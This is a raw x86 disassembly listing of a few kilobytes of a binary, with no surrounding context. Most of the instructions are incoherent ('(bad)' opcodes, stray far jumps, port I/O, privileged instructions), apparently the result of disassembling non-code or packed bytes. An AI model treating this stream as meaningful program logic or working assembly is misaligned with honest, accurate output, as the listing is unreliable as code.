  421900:	mov    ch,0xc9
  421902:	das    
  421903:	popa   
  421904:	sub    DWORD PTR [eax],0xef3c69d9
  42190a:	(bad)  
  42190b:	stc    
  42190c:	dec    edx
  42190d:	jnp    0x42193c
  42190f:	push   esi
  421910:	jnp    0x42194d
  421912:	xlat   BYTE PTR ds:[ebx]
  421913:	sub    edi,ecx
  421915:	lods   al,BYTE PTR ds:[esi]
  421916:	and    al,0x56
  421918:	jns    0x421921
  42191a:	pop    ds
  42191b:	jbe    0x42192b
  42191d:	stos   DWORD PTR es:[edi],eax
  42191e:	into   
  42191f:	cwde   
  421920:	fisttp QWORD PTR [ecx-0x73bf6ade]
  421926:	aaa    
  421927:	ret    0xb65e
  42192a:	dec    ebx
  42192b:	push   es
  42192c:	prefetcht2 BYTE PTR [edi+ebp*1+0x72]
  421931:	and    al,0xa2
  421933:	jno    0x421989
  421935:	mov    esi,0x967ae995
  42193a:	or     BYTE PTR [ecx+0x16],0x5d
  42193e:	mov    dh,0xc4
  421940:	clc    
  421941:	out    0xc3,eax
  421943:	jb     0x42199b
  421945:	stos   DWORD PTR es:[edi],eax
  421946:	sbb    bl,BYTE PTR [edx]
  421948:	sbb    ebx,DWORD PTR [edi+0x22]
  42194b:	das    
  42194c:	lods   eax,DWORD PTR ds:[esi]
  42194d:	fdiv   DWORD PTR [esi+ebp*1-0x77]
  421951:	stc    
  421952:	das    
  421953:	push   0x82facfd8
  421958:	mov    ds:0x99b2a513,eax
  42195d:	pop    ecx
  42195e:	stos   BYTE PTR es:[edi],al
  42195f:	inc    edx
  421960:	test   eax,0x75bdcdc8
  421965:	dec    edx
  421966:	lods   eax,DWORD PTR ds:[esi]
  421967:	dec    esp
  421968:	cmp    al,0xf3
  42196a:	(bad)  
  42196b:	jmp    0x421943
  42196d:	pop    ss
  42196e:	cdq    
  42196f:	mov    eax,ds:0xcd2d9b3a
  421974:	sbb    DWORD PTR [ebx],esi
  421976:	fwait
  421977:	(bad)  
  421978:	repz clc 
  42197a:	inc    esi
  42197b:	shl    BYTE PTR [eax],cl
  42197d:	pop    ecx
  42197e:	or     dl,BYTE PTR [ebx+0x4e]
  421981:	into   
  421982:	and    al,0xd5
  421984:	jne    0x421935
  421986:	jl     0x4219e7
  421988:	(bad)  
  421989:	mov    ds:0x2472933b,al
  42198e:	imul   esp,DWORD PTR [ecx],0x16
  421991:	or     BYTE PTR [edx],cl
  421993:	fldcw  WORD PTR [ecx-0x13]
  421996:	sub    BYTE PTR [ecx+0x54c0932e],bh
  42199c:	pop    es
  42199d:	sbb    ecx,DWORD PTR [ecx+0x2da69fdc]
  4219a3:	sub    ah,bl
  4219a5:	pop    esp
  4219a6:	fbstp  TBYTE PTR [ecx+0x27a9c97d]
  4219ac:	push   edi
  4219ad:	push   es
  4219ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219af:	ficomp DWORD PTR [ebx-0x52]
  4219b2:	aad    0x82
  4219b4:	lock cwde 
  4219b6:	rol    DWORD PTR [edi+0x833e6c2],cl
  4219bc:	add    eax,0xd7667116
  4219c1:	sub    eax,0x1a8861d1
  4219c6:	clc    
  4219c7:	and    DWORD PTR [ebp-0x1e],0x6b36ccb4
  4219ce:	jnp    0x42196b
  4219d0:	retf   0xd780
  4219d3:	adc    eax,0xf2e4608d
  4219d8:	cli    
  4219d9:	les    ebp,FWORD PTR [eax+0x60]
  4219dc:	ja     0x421964
  4219de:	pop    ebp
  4219df:	clc    
  4219e0:	xchg   edx,eax
  4219e1:	dec    ebp
  4219e2:	adc    BYTE PTR [eax+0x31aeec2c],0x69
  4219e9:	pop    esi
  4219ea:	test   eax,0x2d941bdb
  4219ef:	mov    ds:0x526aebe4,eax
  4219f4:	mov    ch,0xf8
  4219f6:	ins    DWORD PTR es:[edi],dx
  4219f7:	jae    0x4219c7
  4219f9:	mov    bh,0x22
  4219fb:	bound  edi,QWORD PTR [esi+0x3b2a41dc]
  421a01:	ja     0x42199d
  421a03:	jmp    0x421a4a
  421a05:	mov    al,ds:0xba9fedaf
  421a0a:	cmp    BYTE PTR [ecx+0x37],bl
  421a0d:	mov    bh,0xff
  421a0f:	sti    
  421a10:	jmp    0xe912:0xa25d185e
  421a17:	cmp    BYTE PTR [edi-0x7c78185a],bl
  421a1d:	xchg   BYTE PTR [esi-0x17],bh
  421a20:	mov    ds:0xd13ab7f,al
  421a25:	test   edx,edi
  421a27:	inc    edx
  421a28:	fwait
  421a29:	(bad)  
  421a2a:	stos   BYTE PTR es:[edi],al
  421a2b:	(bad)  
  421a2c:	add    al,0xc0
  421a2e:	loope  0x421aad
  421a30:	lods   al,BYTE PTR ds:[esi]
  421a31:	add    BYTE PTR [ebp-0x10],dh
  421a34:	cld    
  421a35:	rol    DWORD PTR [ebp-0x16401ad7],1
  421a3b:	(bad)  
  421a3c:	jg     0x421a4d
  421a3e:	cmp    ch,BYTE PTR [edi]
  421a40:	pop    edi
  421a41:	nop
  421a42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a43:	sahf   
  421a44:	sbb    al,0x3d
  421a46:	aad    0x80
  421a48:	adc    al,BYTE PTR [esi]
  421a4a:	outs   dx,DWORD PTR ds:[esi]
  421a4b:	xchg   DWORD PTR [esp+edx*4],edx
  421a4e:	jbe    0x421a11
  421a50:	fidiv  DWORD PTR [ecx+eiz*1-0x2a]
  421a54:	mov    eax,ds:0x20804ed1
  421a59:	(bad)  
  421a5b:	(bad)  
  421a5c:	enter  0x80f,0xf2
  421a60:	xchg   edi,eax
  421a61:	retf   0x695b
  421a64:	jmp    0x7745:0xe607436e
  421a6b:	popa   
  421a6c:	test   eax,0x1b194c9a
  421a71:	jbe    0x421a2d
  421a73:	inc    ebp
  421a74:	jle    0x421a7a
  421a76:	daa    
  421a77:	lahf   
  421a78:	sbb    BYTE PTR [ebp-0x4c8307d1],ch
  421a7e:	stc    
  421a7f:	iret   
  421a80:	repnz or ah,BYTE PTR [eax+eiz*8+0x72c8edf5]
  421a88:	cmp    BYTE PTR [ebx-0x44bdd7bb],dl
  421a8e:	sub    eax,0x66a4ca2d
  421a93:	jmp    0xd09f3314
  421a98:	sub    edx,0xfd3b9908
  421a9e:	mov    WORD PTR [ecx+0x38],cs
  421aa1:	ss inc esi
  421aa3:	pop    ss
  421aa4:	aas    
  421aa5:	outs   dx,DWORD PTR ds:[esi]
  421aa6:	sbb    BYTE PTR [esi+0x1d9ffa13],cl
  421aac:	pop    edi
  421aad:	mov    al,ds:0x5997635d
  421ab2:	sub    esi,edi
  421ab4:	rol    BYTE PTR [ecx-0x68],1
  421ab7:	shl    DWORD PTR [eax+ebx*4],0x9b
  421abb:	dec    ebp
  421abc:	cmp    BYTE PTR [esi+0x48ae052c],cl
  421ac2:	add    DWORD PTR [ebx+0x4069116],esi
  421ac8:	rol    DWORD PTR [edi],0xe4
  421acb:	daa    
  421acc:	aam    0x87
  421ace:	pop    esi
  421acf:	jo     0x421af4
  421ad1:	push   ebx
  421ad2:	push   ecx
  421ad3:	mov    al,ds:0x9c798085
  421ad8:	xor    BYTE PTR [edx],dh
  421ada:	lods   eax,DWORD PTR ds:[esi]
  421adb:	std    
  421adc:	mov    esp,0x67017f8a
  421ae1:	push   ebp
  421ae2:	fstp   TBYTE PTR [ebx]
  421ae4:	clc    
  421ae5:	or     edi,DWORD PTR [ecx+0x5c]
  421ae8:	call   0xb933:0x28628eb8
  421aef:	jmp    0x89626ede
  421af4:	mov    eax,ds:0x358fcda
  421af9:	mov    DWORD PTR [esi-0x263d392d],edx
  421aff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b00:	addr16 mov dh,0x6a
  421b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b04:	mov    ebp,0xbf9ad006
  421b09:	cs iret 
  421b0b:	ret    0x7a2d
  421b0e:	pop    ebp
  421b0f:	and    BYTE PTR [esi+0x10bffff],0xbd
  421b16:	or     ecx,DWORD PTR [ebp-0x56]
  421b19:	fild   QWORD PTR [ecx+0x4991ee00]
  421b1f:	loopne 0x421abf
  421b21:	xchg   edx,eax
  421b22:	mov    WORD PTR [ebp-0x5f],es
  421b25:	aaa    
  421b26:	push   ebp
  421b27:	mov    dh,0x79
  421b29:	cld    
  421b2a:	and    edx,DWORD PTR [ebx-0x1ec1aaac]
  421b30:	push   eax
  421b31:	mov    ecx,0x64f6708
  421b36:	cmp    BYTE PTR [eax+0x69],cl
  421b39:	dec    ebp
  421b3a:	imul   ebx,DWORD PTR [ebp+0x4],0xffffff86
  421b3e:	inc    ecx
  421b3f:	popf   
  421b40:	inc    ebx
  421b41:	xor    BYTE PTR [edi+0x50],bh
  421b44:	jo     0x421b5e
  421b46:	leave  
  421b47:	pusha  
  421b48:	inc    ebx
  421b49:	loope  0x421add
  421b4b:	repnz xchg edi,eax
  421b4d:	push   esp
  421b4e:	sbb    bl,BYTE PTR [ebx+0x45]
  421b51:	push   0x47
  421b53:	dec    eax
  421b54:	sbb    ebp,DWORD PTR [edi-0x114ddc54]
  421b5a:	jg     0x421b20
  421b5c:	xor    dh,BYTE PTR [esi]
  421b5e:	dec    ebp
  421b5f:	sbb    eax,DWORD PTR [esi+0x59]
  421b62:	inc    esp
  421b63:	lahf   
  421b64:	lock sti 
  421b66:	jecxz  0x421bd6
  421b68:	dec    ebx
  421b69:	ffree  st(0)
  421b6b:	out    dx,eax
  421b6c:	test   DWORD PTR [ecx+0x67a1508d],0xeb04092e
  421b76:	ret    
  421b77:	mov    ds:0xa8de2f08,eax
  421b7c:	jge    0x421b68
  421b7e:	add    edx,DWORD PTR [edi+eax*1]
  421b81:	jg     0x421b99
  421b83:	stc    
  421b84:	push   edx
  421b85:	in     eax,0x58
  421b87:	in     al,dx
  421b88:	pop    ebp
  421b89:	mov    ebx,0x7e2acee5
  421b8e:	xor    al,0xc0
  421b90:	loope  0x421bd8
  421b92:	iret   
  421b93:	cmp    eax,0x3f3b02fb
  421b98:	inc    esi
  421b99:	mov    ah,0xb1
  421b9b:	push   eax
  421b9c:	pop    edi
  421b9d:	cmp    eax,0x2e6986db
  421ba2:	aas    
  421ba3:	ds mov eax,DWORD PTR cs:0x41cdd50a
  421bab:	xchg   edi,eax
  421bac:	scas   eax,DWORD PTR es:[edi]
  421bad:	sbb    edi,esp
  421baf:	add    eax,DWORD PTR [eax+0x7b]
  421bb2:	retf   
  421bb3:	adc    esi,DWORD PTR [ecx+eax*4+0x493c5ee1]
  421bba:	rcr    ch,1
  421bbc:	cmp    ah,BYTE PTR [edx+0x3]
  421bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421bc0:	adc    eax,0xa0d3ab2b
  421bc5:	stos   BYTE PTR es:[edi],al
  421bc6:	lahf   
  421bc7:	adc    eax,0x62365285
  421bcc:	test   eax,0x2448bbc7
  421bd1:	lds    edx,FWORD PTR [esi-0x1cfd59bd]
  421bd7:	mov    ds:0x5389c41a,al
  421bdc:	dec    ebx
  421bdd:	dec    eax
  421bde:	add    DWORD PTR [esi],esp
  421be0:	retf   
  421be1:	inc    esi
  421be2:	mov    DWORD PTR [ecx],0x9bc008a
  421be8:	popf   
  421be9:	sub    BYTE PTR [ebp+0x269e636d],ah
  421bef:	sbb    ah,al
  421bf1:	inc    ebx
  421bf2:	popf   
  421bf3:	jne    0x421b80
  421bf5:	data16 adc ch,BYTE PTR [ebp+0x65]
  421bf9:	gs cwde 
  421bfb:	sub    DWORD PTR [eax+eiz*1+0x504a7f8c],eax
  421c02:	cmp    BYTE PTR [esi+0x43],dh
  421c05:	or     eax,0x954cb4d9
  421c0a:	arpl   dx,bp
  421c0c:	aad    0x7f
  421c0e:	adc    al,0xcf
  421c10:	por    mm5,QWORD PTR [ecx-0x52]
  421c14:	adc    DWORD PTR [edi],ecx
  421c16:	retf   0x60b1
  421c19:	lock mov ebp,db5
  421c1d:	dec    edi
  421c1e:	mov    esp,0x17becf59
  421c23:	push   ebp
  421c24:	mov    al,BYTE PTR [edx+ebx*2-0x192a8dca]
  421c2b:	adc    al,0xf
  421c2d:	mov    edi,gs
  421c2f:	ds dec ecx
  421c31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c32:	gs mov ebp,0xa7ef1f73
  421c38:	jae    0x421bf2
  421c3a:	ret    
  421c3b:	scas   eax,DWORD PTR es:[edi]
  421c3c:	data16 mov ch,0x5b
  421c3f:	aad    0xb2
  421c41:	mov    bl,0xab
  421c43:	xchg   ecx,eax
  421c44:	repz push 0xffffffbd
  421c47:	push   es
  421c48:	xchg   edi,eax
  421c49:	xchg   edi,eax
  421c4a:	mov    ebp,0x1d13d06e
  421c4f:	xchg   ebp,eax
  421c50:	jbe    0x421c3c
  421c52:	push   ecx
  421c53:	retf   0xe2a0
  421c56:	jle    0x421ca0
  421c58:	jb     0x421cd9
  421c5a:	xchg   edx,eax
  421c5b:	(bad)  
  421c5c:	pusha  
  421c5d:	nop
  421c5e:	jnp    0x421c61
  421c60:	outs   dx,DWORD PTR ds:[esi]
  421c61:	scas   al,BYTE PTR es:[edi]
  421c62:	lods   al,BYTE PTR ds:[esi]
  421c63:	les    ebx,FWORD PTR [bp-0x64]
  421c67:	sub    eax,0xeaf5dc0f
  421c6c:	jo     0x421c1c
  421c6e:	xchg   edi,eax
  421c6f:	les    eax,FWORD PTR [ebx-0x6e]
  421c72:	jne    0x421ccd
  421c74:	xchg   DWORD PTR [ebx-0x5b],esi
  421c77:	jmp    0xc7ae2b6f
  421c7c:	push   esi
  421c7d:	add    dh,BYTE PTR [eax+eiz*1+0x6811f081]
  421c84:	jno    0x421cfe
  421c86:	cmovp  esi,ebp
  421c89:	push   edi
  421c8a:	fmul   QWORD PTR [ecx-0x7e]
  421c8d:	and    DWORD PTR ds:0xa6a3e454,0x1
  421c94:	gs leave 
  421c96:	loop   0x421c98
	...
  421d14:	arpl   WORD PTR [esi+0x63ff63be],bx
  421d1a:	call   FWORD PTR [esi-0x676d79db]
  421d20:	jle    0x421cf5
  421d22:	mov    bl,0x98
  421d24:	clc    
  421d25:	mov    bl,0x1
  421d27:	add    BYTE PTR [ebx+0x7],ch
  421d2a:	add    BYTE PTR [eax],al
  421d2c:	loopne 0x421d6f
  421d2e:	mov    bh,0x60
  421d30:	rol    DWORD PTR [ecx-0x78a6d164],cl
  421d36:	out    dx,al
  421d37:	ficom  WORD PTR [ebx]
  421d39:	lock scas eax,DWORD PTR es:[edi]
  421d3b:	push   edi
  421d3c:	pop    ebx
  421d3d:	jl     0x421cc3
  421d3f:	js     0x421d24
  421d41:	and    eax,0x99722a8d
  421d46:	adc    BYTE PTR ds:0xbaa1b5b8,ah
  421d4c:	push   0x38
  421d4e:	call   0x57cadc0d
  421d53:	pop    ebp
  421d54:	in     al,0x5d
  421d56:	xor    al,0x31
  421d58:	sti    
  421d59:	add    edi,eax
  421d5b:	push   es
  421d5c:	xchg   esp,eax
  421d5d:	add    BYTE PTR [edi],dl
  421d5f:	div    DWORD PTR [edx]
  421d61:	adc    BYTE PTR [edi],ah
  421d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d64:	cmp    eax,0xbdf8216a
  421d69:	xchg   ebp,eax
  421d6a:	mov    bh,0x9c
  421d6c:	or     eax,0xd84a435f
  421d71:	mov    edi,DWORD PTR [ecx-0x2d]
  421d74:	xor    eax,0xbf816574
  421d79:	and    eax,0xc30f990f
  421d7e:	imul   esp,DWORD PTR [edx],0xffffffc8
  421d81:	jae    0x421d14
  421d83:	mov    edx,0x43721e98
  421d88:	jb     0x421db0
  421d8a:	xchg   esp,eax
  421d8b:	shl    DWORD PTR [ebp+edx*4-0x159c281],cl
  421d92:	or     eax,esp
  421d94:	mov    bh,0xe1
  421d96:	test   BYTE PTR [edx],bh
  421d98:	call   0xf3e960f9
  421d9d:	dec    esp
  421d9e:	mov    eax,ds:0x9294f1cf
  421da3:	adc    bl,BYTE PTR [ebx]
  421da5:	das    
  421da6:	xchg   esp,eax
  421da7:	sub    DWORD PTR [esi-0x40],esp
  421daa:	nop
  421dab:	gs jns 0x421dd1
  421dae:	inc    bl
  421db0:	cwde   
  421db1:	sbb    eax,0x6c908517
  421db6:	sar    BYTE PTR [edi-0x32],cl
  421db9:	imul   edx,DWORD PTR [edx],0xffffffef
  421dbc:	loopne 0x421dac
  421dbe:	aad    0xc5
  421dc0:	icebp  
  421dc1:	fs pop ebx
  421dc3:	mov    ds:0xd656c883,eax
  421dc8:	out    dx,eax
  421dc9:	call   0x5b55:0xf07d2dae
  421dd0:	mov    edx,0x494499ec
  421dd5:	push   esp
  421dd6:	shl    bh,0xd6
  421dd9:	sbb    eax,0x90265027
  421dde:	hlt    
  421ddf:	mov    ebx,0xd1bf4533
  421de4:	in     eax,dx
  421de5:	nop
  421de6:	push   esp
  421de7:	mov    cl,0x16
  421de9:	push   ss
  421dea:	lahf   
  421deb:	dec    esp
  421dec:	jg     0x421e0d
  421dee:	ret    0x9dc5
  421df1:	es pusha 
  421df3:	imul   esi,DWORD PTR [ebx+0xef2dd3a],0xbd33d569
  421dfd:	in     eax,dx
  421dfe:	adc    eax,0x650dd8a7
  421e03:	push   edx
  421e04:	jl     0x421e71
  421e06:	leave  
  421e07:	mov    ah,0x1b
  421e09:	add    ch,BYTE PTR [ecx+0x23]
  421e0c:	mov    ds:0x2f971105,eax
  421e11:	jno    0x421e0e
  421e13:	adc    DWORD PTR [edi],ecx
  421e15:	clc    
  421e16:	fs pop es
  421e18:	inc    ebx
  421e19:	call   0xd5af:0x3765b504
  421e20:	push   esp
  421e21:	cmp    cl,BYTE PTR [esp+ebp*2-0x12247af8]
  421e28:	jle    0x421e4b
  421e2a:	or     eax,0xeaeadeb4
  421e2f:	xchg   BYTE PTR [ebx-0x79],cl
  421e32:	xchg   edx,eax
  421e33:	and    edx,DWORD PTR [ebx]
  421e35:	in     eax,0x2f
  421e37:	mov    cl,0xda
  421e39:	push   ecx
  421e3a:	pop    DWORD PTR [edx-0x7f41b20d]
  421e40:	mov    dl,0x46
  421e42:	adc    eax,0x93acd165
  421e47:	cmp    ebx,DWORD PTR [eax]
  421e49:	je     0x421e48
  421e4b:	mov    BYTE PTR [ebx+0x35],ch
  421e4e:	dec    eax
  421e4f:	ds pushf 
  421e51:	fisubr DWORD PTR [ecx]
  421e53:	adc    dl,BYTE PTR [eax-0x22]
  421e56:	mov    ebx,0x6346ee7f
  421e5b:	stc    
  421e5c:	jecxz  0x421e69
  421e5e:	pop    ebp
  421e5f:	les    ecx,FWORD PTR [esi]
  421e61:	sbb    esp,DWORD PTR [eax+0x2b]
  421e64:	or     eax,DWORD PTR [ebp+0x6f9d8f3]
  421e6a:	aaa    
  421e6b:	je     0x421e07
  421e6d:	inc    ebx
  421e6e:	adc    DWORD PTR ds:0x2d82f062,ebp
  421e74:	data16 shl BYTE PTR [edx-0x1d],cl
  421e78:	and    eax,0xad090618
  421e7d:	mov    WORD PTR [ebx-0x2a5193d9],bp
  421e84:	out    dx,eax
  421e85:	push   ss
  421e86:	std    
  421e87:	mov    ebp,0x56003e6
  421e8c:	ins    BYTE PTR es:[edi],dx
  421e8d:	push   edx
  421e8e:	lods   eax,DWORD PTR ds:[esi]
  421e8f:	dec    edi
  421e90:	fstp   TBYTE PTR [ecx-0x30]
  421e93:	out    dx,al
  421e94:	and    eax,0x9d075fc2
  421e99:	pusha  
  421e9a:	shl    BYTE PTR [ebx-0x25],0x6b
  421e9e:	pop    ebp
  421e9f:	inc    ecx
  421ea0:	sub    bh,BYTE PTR [ecx-0x647997a4]
  421ea6:	(bad)  
  421ea8:	(bad)  
  421ea9:	push   esi
  421eaa:	adc    eax,0x43667388
  421eaf:	and    ebx,DWORD PTR [ebp+0x79d15c8d]
  421eb5:	push   ss
  421eb6:	das    
  421eb7:	hlt    
  421eb8:	cli    
  421eb9:	pusha  
  421eba:	push   edx
  421ebb:	and    al,0x20
  421ebd:	ds loopne 0x421ef9
  421ec0:	and    eax,0xc347897c
  421ec5:	inc    esp
  421ec6:	cmp    al,BYTE PTR [edx]
  421ec8:	fistp  WORD PTR [edx+eax*4]
  421ecb:	lea    ebp,[edx+0x7c]
  421ece:	xchg   ebp,eax
  421ecf:	sub    ebx,DWORD PTR [ebx]
  421ed1:	sar    DWORD PTR [edi],1
  421ed3:	in     al,0x51
  421ed5:	mov    esp,0x1af6a94e
  421eda:	mov    WORD PTR [esi+0x1e],?
  421edd:	dec    ebx
  421ede:	jp     0x421e6c
  421ee0:	sub    DWORD PTR [edi],eax
  421ee2:	mov    esi,0xc03a74a
  421ee7:	cli    
  421ee8:	sub    al,0x21
  421eea:	cmp    al,0x4e
  421eec:	or     BYTE PTR [edx+0x6c134dde],0x17
  421ef3:	(bad)  
  421ef4:	cmp    ebx,DWORD PTR [eax+0x5f]
  421ef7:	cmp    al,0xa5
  421ef9:	(bad)  
  421efa:	out    0xf6,eax
  421efc:	popf   
  421efd:	test   DWORD PTR [ecx+0x24],edx
  421f00:	xor    BYTE PTR [edx],0xc5
  421f03:	out    0x21,al
  421f05:	icebp  
  421f06:	inc    eax
  421f07:	mul    edx
  421f09:	ret    0xa47a
  421f0c:	cmp    DWORD PTR [edi+0x6b38fd89],0xe91d484e
  421f16:	das    
  421f17:	mov    ds:0xf340dc9,al
  421f1c:	call   0x2f24:0x92dd4650
  421f23:	or     eax,0x18da2db0
  421f28:	ds jecxz 0x421f42
  421f2b:	add    BYTE PTR [ebp-0x790b8b59],al
  421f31:	or     al,0x78
  421f33:	rcr    BYTE PTR [eax+0x9],1
  421f36:	ss sbb eax,ebp
  421f39:	mov    edx,0x6e444d61
  421f3e:	addr16 mov al,ds:0x11e0
  421f42:	(bad)  
  421f43:	jb     0x421f43
  421f45:	push   0x366a8c9b
  421f4a:	mov    ah,0x21
  421f4c:	jo     0x421f5f
  421f4e:	(bad)  
  421f50:	adc    DWORD PTR [bx+di],ebx
  421f53:	es inc esi
  421f55:	fldcw  WORD PTR [esi+0x45]
  421f58:	rol    BYTE PTR ds:0x97b27d0d,cl
  421f5e:	fnstsw WORD PTR [esi+ebx*2-0x15]
  421f62:	push   eax
  421f63:	test   eax,0xd49bb095
  421f68:	mov    DWORD PTR [edx-0x4f828031],edx
  421f6e:	xchg   edx,eax
  421f6f:	mov    al,0xd4
  421f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f72:	stc    
  421f73:	and    DWORD PTR [edi+ecx*1],ebx
  421f76:	lods   al,BYTE PTR ds:[esi]
  421f77:	(bad)  
  421f78:	fisub  WORD PTR [ebp-0xd]
  421f7b:	sbb    DWORD PTR [edx-0x1c],edx
  421f7e:	sbb    eax,0x910d1d7d
  421f83:	shl    BYTE PTR [ebp+esi*2+0x43c04083],cl
  421f8a:	sub    eax,0x7bdfcf27
  421f8f:	pop    esi
  421f90:	jmp    0x16de7948
  421f95:	test   BYTE PTR [ebx-0x7954ff89],ch
  421f9b:	popf   
  421f9c:	das    
  421f9d:	fcmovnu st,st(6)
  421f9f:	ins    DWORD PTR es:[edi],dx
  421fa0:	ja     0x421fb6
  421fa2:	lods   al,BYTE PTR ds:[esi]
  421fa3:	(bad)  
  421fa4:	mov    esp,0x1c5799ac
  421fa9:	mov    eax,ds:0x6c0dfe6e
  421fae:	das    
  421faf:	inc    esi
  421fb0:	mov    edx,gs
  421fb2:	mov    ds:0xd6e1c18f,al
  421fb7:	xchg   ebx,eax
  421fb8:	pop    esi
  421fb9:	jnp    0x421fa6
  421fbb:	mov    ch,0x4b
  421fbd:	pop    ds
  421fbe:	jns    0x421f9f
  421fc0:	pusha  
  421fc1:	imul   esi,DWORD PTR [ebp+0x0],0x56
  421fc5:	mov    edi,0x756609c1
  421fca:	sub    dl,0xcd
  421fcd:	dec    ebp
  421fce:	clc    
  421fcf:	je     0x421fe2
  421fd1:	pop    edi
  421fd2:	(bad)  
  421fd3:	cdq    
  421fd4:	mov    BYTE PTR [ecx+eax*8-0x6600ed9a],al
  421fdb:	mov    dl,0xc1
  421fdd:	imul   ebx,DWORD PTR [ebp+0x5d],0x59
  421fe1:	sub    DWORD PTR [ecx],esi
  421fe3:	mov    dh,0x34
  421fe5:	fldcw  WORD PTR [esi+ebx*8]
  421fe8:	fiadd  WORD PTR [eax-0x39f53716]
  421fee:	push   0x12
  421ff0:	and    al,0x76
  421ff2:	jle    0x421fb0
  421ff4:	mov    bh,0x63
  421ff6:	mov    esp,0x92458387
  421ffb:	mov    eax,0xf72c2c8a
  422000:	sahf   
  422001:	add    al,0xc6
  422003:	mov    ds:0xa82d1c6,al
  422008:	adc    eax,0x1a2247bb
  42200d:	xchg   ecx,eax
  42200e:	push   ds
  42200f:	jnp    0x42207d
  422011:	dec    esp
  422012:	xor    BYTE PTR [edi-0x7a0757d5],dh
  422018:	dec    ebx
  422019:	dec    ebp
  42201a:	sbb    dl,BYTE PTR [ebx+0x671f5af9]
  422020:	xchg   edx,eax
  422021:	inc    esp
  422022:	cmp    al,0x28
  422024:	pusha  
  422025:	push   cs
  422026:	push   0xffffffb9
  422028:	inc    eax
  422029:	(bad)
  42202c:	jp     0x42201c
  42202e:	add    BYTE PTR [edi-0x153a190c],0xc1
  422035:	pusha  
  422036:	cdq    
  422037:	push   ebx
  422038:	imul   ebp,DWORD PTR [ebp+0x6],0x1c
  42203c:	push   cs
  42203d:	cld    
  42203e:	dec    ecx
  42203f:	ss sahf 
  422041:	test   DWORD PTR [esp+ebp*2-0x27],eax
  422045:	push   cs
  422046:	sbb    dh,BYTE PTR [ecx]
  422048:	pop    ebp
  422049:	jae    0x422017
  42204b:	mov    esi,0xc280ab51
  422050:	mov    ds:0x1e91003,eax
  422055:	push   ebp
  422056:	stc    
  422057:	dec    edx
  422058:	jmp    0x7ab6:0xc912aae5
  42205f:	cmp    eax,0x65c7a225
  422064:	sbb    esp,esp
  422066:	cmp    eax,0x53beac4a
  42206b:	jge    0x4220e4
  42206d:	mov    ecx,0x5dcfbd4c
  422072:	imul   edx
  422074:	mov    WORD PTR [eax-0x42],?
  422077:	xchg   esp,eax
  422078:	jge    0x42203b
  42207a:	adc    al,0x79
  42207c:	stos   BYTE PTR es:[edi],al
  42207d:	sti    
  42207e:	mov    cl,0xb0
  422080:	nop
  422081:	pushf  
  422082:	push   ecx
  422083:	outs   dx,BYTE PTR ds:[esi]
  422084:	arpl   dx,sp
  422086:	in     al,0xba
  422088:	in     eax,0xf1
  42208a:	pushf  
  42208b:	idiv   DWORD PTR [esi+0x2a]
  42208e:	push   edx
  42208f:	out    dx,eax
  422090:	cmp    edx,DWORD PTR [ecx+0x33]
  422093:	add    cl,BYTE PTR [ecx+0x24]
  422096:	mov    esp,0x3324d15e
  42209b:	repnz pop esp
  42209d:	inc    esi
  42209e:	sub    ah,dl
  4220a0:	sbb    bl,dl
  4220a2:	arpl   WORD PTR [ecx+0x63],bx
  4220a5:	add    al,0x6
  4220a7:	es inc edx
  4220a9:	mov    esi,0x68df0def
  4220ae:	les    esp,FWORD PTR [eax+0x64c5c07a]
  4220b4:	jne    0x4220c9
  4220b6:	mov    edi,0xbccb57ef
  4220bb:	sbb    al,0xa9
  4220bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220be:	dec    esp
  4220bf:	mov    ch,0x79
  4220c1:	xchg   esi,eax
  4220c2:	fwait
  4220c3:	call   DWORD PTR es:[edi-0x65]
  4220c7:	mov    ds:0x7aa8275b,eax
  4220cc:	mov    eax,ds:0xf3025561
  4220d1:	outs   dx,DWORD PTR ds:[esi]
  4220d2:	xchg   ebp,eax
  4220d3:	out    0xe8,eax
  4220d5:	hlt    
  4220d6:	mov    eax,ds:0xb8bcf030
  4220db:	cmp    BYTE PTR [esi],0xa2
  4220de:	jl     0x4220ef
  4220e0:	xor    al,0xfc
  4220e2:	add    ch,BYTE PTR [eax-0x26]
  4220e5:	xchg   edi,eax
  4220e6:	cmp    DWORD PTR [ebx-0x4e],0x17
  4220ea:	ins    BYTE PTR es:[edi],dx
  4220eb:	(bad)  
  4220ec:	push   ecx
  4220ed:	and    edi,ebp
  4220ef:	imul   esp,DWORD PTR [edx+ebx*1-0x35],0xafeb992f
  4220f7:	ja     0x422108
  4220f9:	fldenv [ebp-0x1e]
  4220fc:	stos   BYTE PTR es:[edi],al
  4220fd:	cmp    ebx,esi
  4220ff:	xchg   edx,eax
  422100:	mov    al,0x91
  422102:	xchg   ebx,eax
  422103:	push   es
  422104:	dec    esp
  422105:	jp     0x4220ee
  422107:	sub    DWORD PTR [ecx+edi*1+0x3e995563],esp
  42210e:	xchg   ecx,eax
  42210f:	cmovl  esp,esi
  422112:	xchg   esp,eax
  422113:	loop   0x4220a8
  422115:	add    DWORD PTR [eax],eax
  422117:	mov    DWORD PTR [edi],ecx
  422119:	jb     0x422118
  42211b:	sub    al,0x91
  42211d:	jl     0x4220ed
  42211f:	jns    0x4220a2
  422121:	sahf   
  422122:	or     dl,BYTE PTR [edi-0x7f5ebb6d]
  422128:	clc    
  422129:	dec    ebp
  42212a:	and    BYTE PTR [ebx+0x1ad7d693],dh
  422130:	nop
  422131:	xchg   edi,eax
  422132:	xor    DWORD PTR [eax-0x79],0xee7a574f
  422139:	ins    DWORD PTR es:[edi],dx
  42213a:	jmp    DWORD PTR [esi]
  42213c:	je     0x4221b1
  42213e:	mov    bh,0x34
  422140:	in     al,0x20
  422142:	ss pushf 
  422144:	iret   
  422145:	inc    esi
  422146:	pop    esp
  422147:	rol    WORD PTR [ebx+0x2d],0xd
  42214c:	lea    esi,[esi+0x21]
  42214f:	ins    DWORD PTR es:[edi],dx
  422150:	test   eax,0x352e090
  422155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
